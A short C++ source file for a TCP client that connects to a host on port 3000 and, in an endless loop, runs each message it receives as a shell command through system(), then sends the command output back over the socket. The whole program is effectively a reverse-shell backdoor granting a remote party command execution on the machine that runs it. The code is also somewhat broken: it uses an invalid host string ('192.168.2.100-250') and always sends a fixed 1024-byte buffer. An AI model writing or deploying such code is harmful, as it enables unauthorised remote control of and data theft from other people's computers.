#include<iostream>
#include<fstream>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <string.h>
#include <stdio.h> 
#include <sys/socket.h> 
#include <stdlib.h> 
#include <netinet/in.h> 
#include <string.h> 
#include <unistd.h>
using namespace std;
#define PORT "3000"


int main(){
	struct addrinfo hints;
	struct addrinfo* servinfo,*p;
	int sockfd;

	memset(&hints,0,sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	// hints.ai_flags = AI_PASSIVE; 
	//hints.ai_protocol = 0; //find number for IPV4
	
	int status = getaddrinfo("192.168.2.100-250",PORT, &hints, &servinfo);
	if(status != 0){
		std::cout<<"Couldn't load the server\n";
		exit(1);
	}
	
	for(p = servinfo; p != NULL; p = p->ai_next) {
	    if ((sockfd = socket(p->ai_family, p->ai_socktype,
	            p->ai_protocol)) == -1) {
	        perror("socket");
	        continue;
	    }

	    if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
	        perror("connect");
	        close(sockfd);
	        continue;
	    }

	    break; // if we get here, we must have connected successfully
	}

	if (p == NULL) {
		fprintf(stderr, "client: failed to connect\n");
		return 2;
	}
	
	cout <<"Connected to server\n";
	freeaddrinfo(servinfo);

	char message[1024];
	while(1){
	   bzero(message,1024);
	   read(sockfd, message, sizeof(message));
	   string str(message);
	   str += " >temp.txt";
	   system(str.c_str());

	   ifstream myfile("temp.txt");
	   string to_send;
		  string line;
		  if (myfile.is_open())
		  {
		    while ( getline (myfile,line) )
		    {
		      to_send += line;
		      cout << line << endl;
		    }
		    myfile.close();
		  }
		  
		cout << to_send << endl;  
		int bytes_sent = send(sockfd ,(void *)to_send.c_str(), 1024,0);
		if (bytes_sent <= 0){
			cout<<"Error in sending data";
		}
	}
		
	freeaddrinfo(servinfo);
}
